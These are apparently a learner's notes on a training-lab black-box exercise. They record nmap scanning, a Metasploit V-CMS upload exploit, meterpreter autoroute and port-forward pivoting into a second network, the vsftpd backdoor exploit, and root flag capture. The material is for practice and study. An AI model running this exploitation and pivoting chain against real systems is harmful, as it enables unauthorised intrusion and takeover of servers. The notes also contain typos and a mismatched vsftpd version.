# Blackbox 1 try 2

## $ip addr
eth1:
- 192.56.145.2/24

## $nmap -sS -sT demo.ine.local
Ip:
- 192.56.145.3
Port 80:
- tcp http, nginx 1.14.0
Port 3306:
- tcp mySQL, MySQL

## Accessing demo.ine.local
V-cms
- Powered by V-cms v1.0

## $searchsploit v-cms
Arbitrary .PHP file Upload/ Execution
- Metasploit

## $msfconsole -q
Metasploit
- exploit/linux/http/vcms_upload

## $use /exploit/linux/http/vcms_upload and $show options
Need:
- RHOSTS = remote host
- LHOST = local host
- TARGETURI = exploit URI

## $getuid
Get the remote server UID
- ROOT is the goal

## cat /root/flag.txt
- Pwn first machine

## Find the second remote machine: $shell
Setup a shell on the remote machine 1

## $ifconfig
Check the route for other machine
- eth1: 192.107.58.2

## Setup autoroute:
Since the remote machine is not accesible from the host machine, we need to setup a route to get access from the host. Can check from host with: $ping 192.107.58.2. The result is 100$ packet lose.

## Check config for autoroute: $run autoroute -h
Command:
- $run autoroute -s ip -n ip

## Autoroute in metepreter
- run autoroute -s 192.107.58.0 -n 255.255.255.0

## put the session in background: $background
Check if the route is right:
- $route print

## Add the route to metasploit framework
Since the route is all ready added to meterpreter we can add it with route add inn metasploit:
- $route add 192.107.58.0 255.255.255.0 1
- The number 1 at the last is the session id

## Scan the remote machien for ports
Use the auxiliary/scanner/portscan/tcp library from metasploit:
- $use auxiliary/scanner/portscan/tcp

## $show options
- set PORTS 80, 800, 445, 21, 22
- set RHOSTS 192.107.58.3-10 (Check any available host between 3-10)
- exploit

## Understand open port output
- Port 21: ftp
- Port 22: ssh

## Exploit port 21, with portfwd
Open the session 1 from earlier:
- $sessions -i 1

## setup a portfard for port 1234
check cmd:
- $portfwd -h
Add port:
- $portfwd add -l 1234 -p 21 -r 192.107.58.3
Check if the port is added:
- $portfwd list

## Scan the remotemachine for port
Since the port is forwarded we can access the remote machine from msfconsole.
Scan the remote machine with nmap:
- $background
- $nmap -sS -sV -p 1234 localhost

## Understanding the output
Open port with running vsftpd 2.0.8

## Use matasploit for exploiting the remote machine
search for exploit:
- $search vsftpd
use the exploit:
- use exploit/unix/ftp/vsftpd_234_backdoor
show options:
- show options
exploit:
- set RHOSTS 192.107.58.3
get uid:
- id
cat flag:
- cat /root/flag.txt
 
